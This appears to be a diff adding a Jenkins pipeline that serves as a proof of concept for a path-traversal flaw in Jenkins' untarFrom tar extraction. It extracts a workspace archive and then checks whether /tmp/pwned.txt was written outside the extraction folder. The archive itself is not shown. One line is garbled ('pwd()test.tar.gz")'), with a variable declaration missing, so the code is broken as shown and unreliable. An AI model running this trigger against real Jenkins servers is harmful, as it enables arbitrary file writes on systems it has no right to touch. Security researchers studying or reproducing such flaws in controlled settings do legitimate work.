@@ -1,0 +1,31 @@
+pipeline {
+  agent any
+
+  stages {
+    stage('Trigger Jenkins untarFrom') {
+      steps {
+        script {
+          String ws = pwd()test.tar.gz")
+          if (!src.exists()) {
+            error("test.tar.gz not found in workspace")
+          }
+
+          File extractDir = new File(ws, "extract_here")
+          extractDir.mkdirs()
+
+          def target = new hudson.FilePath(extractDir)
+          src.withInputStream { is ->
+            target.untarFrom(is, hudson.FilePath.TarCompression.GZIP)
+          }
+        }
+      }
+    }
+
+    stage('Verify') {
+      steps {
+        sh 'ls -l /tmp/pwned.txt || true'
+        sh 'cat /tmp/pwned.txt || true'
+      }
+    }
+  }
+}
